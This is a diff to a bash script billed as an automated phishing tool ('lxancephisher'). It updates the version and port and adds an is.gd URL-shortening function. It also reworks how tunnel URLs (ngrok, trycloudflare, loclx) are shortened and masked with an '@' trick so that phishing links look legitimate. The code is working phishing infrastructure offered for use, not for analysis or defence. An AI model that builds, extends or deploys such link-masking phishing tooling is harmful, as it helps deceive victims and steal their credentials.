@@ -2,7 +2,7 @@
 
 ##   lxancephisher 	: 	Automated Phishing Tool
 ##   Author 		: 	Prince Katiyar
-##   Version 		: 	1.3
+##   Version 		: 	1.5
 ##   Github 		: 	https://github.com/LxaNce-Hacker/lxancephisher
 
 
@@ -79,11 +79,11 @@
 ##      Copyright (C) 2022 LXANCE-HACKER (https://github.com/LxaNce-Hacker)
 ##
 
-__version__="1.3"
+__version__="1.5"
 
 ## DEFAULT HOST & PORT 
 HOST='127.0.0.1'
-PORT='8080' 
+PORT='8090' 
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -590,6 +590,7 @@ custom_mask() {
 ## URL Shortner
 site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
 
+## Shorten for shortcode & tinyurl
 shorten() {
 	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
 	if [[ "$1" == *"shrtco.de"* ]]; then
@@ -597,6 +598,17 @@ shorten() {
 	else
 		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
 		processed_url=${short#http*//}
+	fi
+}
+
+## Shorteny for isgd
+shorteny() {
+	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	if [[ "$1" == *"shrtco.de"* ]]; then
+		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	else
+		# processed_url=$(echo "$short" | awk -F// '{print $NF}')
+		processed_url="www."${short#http*//}
 	fi
 }
 
@@ -609,16 +621,16 @@ custom_url() {
 	{ custom_mask; sleep 1; clear; banner_small; }
 	if [[ ${url} =~ [-a-zA-Z0-9.]*(ngrok.io|trycloudflare.com|loclx.io) ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
-			shorten $isgd "$url"
+			shorteny $isgd "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
 			shorten $shortcode "$url"
 		else
 			shorten $tinyurl "$url"
 		fi
-
+		
 		url="https://$url"
 		masked_url="$mask@$processed_url"
-		processed_url="https://www.$processed_url"
+		processed_url="https://$processed_url"
 	else
 		# echo "[!] No url provided / Regex Not Matched"
 		url="Unable to generate links. Try after turning on hotspot"
